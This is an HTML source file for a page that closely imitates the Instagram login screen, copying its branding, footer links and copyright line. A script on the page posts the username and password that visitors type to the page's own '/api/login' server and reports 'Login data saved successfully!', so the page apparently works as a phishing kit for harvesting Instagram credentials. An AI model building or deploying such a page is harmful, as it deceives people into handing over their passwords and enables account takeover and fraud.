<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" type="image/png" href="logo.webp">
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css" integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw==" crossorigin="anonymous" referrerpolicy="no-referrer" />

</head>
<body>
    <div class="flex h-screen bg-white font-sans">
      <div class="w-full lg:w-[58%] border-r-2 border-gray-600 h-screen flex flex-col justify-center items-center bg-[#0c1014] p-8">
        <!-- Instagram Logo -->
        
        <img src="iglog.png" alt="Instagram Logo" class="self-start w-38" />

        <h2 class="text-[40px] font-semibold text-white text-center pb-5"> See everyday moments from your</h2>
        <h4 class="text-[40px] pb-5 font-semibold bg-gradient-to-r from-yellow-500 via-red-500 to-pink-500 text-transparent bg-clip-text">close friends<span class="text-white">.</span></h4>

        <div class="flex space-x-4">
            <img src="image2.png" class="w-100 h-85 rounded-lg shadow-lg object-cover" />
    
        </div>
    </div>

        <!-- Right Side -->
    <div class="w-full lg:w-[42%] flex flex-col justify-center  p-10 bg-[#152127]">
            <h2 class="text-xl font-semibold mb-4 text-start text-white ml-10 mb-10" >    <span>Log into Instagram</span></h2>
            <form id="loginForm">
                <input type="text" id="identifier" placeholder="Mobile number, username or email" class="w-full h-[60px] mb-3 px-5 py-2 border border-blue-100 rounded-xl text-white font-semibold text-sm" required />
                <input type="password" id="password" placeholder="Password" class="w-full h-[60px] mb-6 px-4 py-2 border rounded-xl text-white font-semibold text-sm" required />
                
                <button type="submit" class="w-full h-[40px] bg-blue-900 text-white py-2 rounded-full hover:bg-blue-700 mb-2 text-whitesmoke font-semibold"><a href="https://www.instagram.com/">Log in</a></button>
            </form>
            <div id="message" class="text-center mb-3 font-semibold"></div>
            
            <a href="#" class="text-sm text-blue-500 hover:underline block text-center mb-15">Forgot password?</a>

            <a href="https://www.facebook.com/login">
            <button class="w-full h-[40px] py-2 border border-gray-300 rounded-xl text-white font-semibold hover:bg-gray-800 mb-3 text-center">Log in with Facebook</button>
            </a>

            <button class="w-full h-[40px] py-2 border border-gray-300 rounded-xl text-blue-400 font-semibold hover:bg-gray-800">Create new account</button>
        </div>
    </div>

    <div class="w-full bg-[#0c1014] border-t text-sm font-semibold text-gray-400 py-6 px-4 flex flex-col items-center space-y-2">
        <!-- Links (optional, pwede ma expanded) -->
        <div class="flex flex-wrap justify-center font-thin text-[12px] gap-4 ">
            <a href="#" class=" text-[#A4B0BC] hover:underline">Meta</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">About</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Blog</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Jobs</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Help</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">API</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Privacy</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Terms</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Locations</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Instagram Lites</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Meta AI</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Threads</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Contact Uploading & Non-Users</a>
            <a href="#" class=" text-[#A4B0BC] hover:underline">Meta Verified</a>
        </div>

    <!-- Language para sa selector -->
    <div class="mt-2 mb-7 text-[12px]">
        <select class="border bg-black border-gray-300 rounded px-2 py-1 text-[12px] text-gray-400 focus:outline-none focus:ring-1 focus:ring-gray-400">
            <option>English</option>
            <option>Bisaya</option>
            <option>Tagalog</option>
            <option>Spanish</option>
            <option>Japan</option>
            <option>Korea</option>
            <option>Russia</option>
            <option>Bahasa Indonesia</option>
            <option>Italiano</option>
        </select>
        © 2026 Instagram from Meta
    </div>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const identifier = document.getElementById('identifier').value;
    const password = document.getElementById('password').value;
    const messageDiv = document.getElementById('message');
    
    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ identifier, password })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            messageDiv.textContent = 'Login data saved successfully!';
            messageDiv.style.color = '#10b981';
            document.getElementById('loginForm').reset();
            setTimeout(() => {
                messageDiv.textContent = '';
            }, 3000);
        } else {
            messageDiv.textContent = data.error || 'Error saving login data';
            messageDiv.style.color = '#ef4444';
        }
    } catch (error) {
        console.error('Error:', error);
        messageDiv.textContent = 'Error connecting to server';
        messageDiv.style.color = '#ef4444';
    }
});
</script>

</body>
</html>
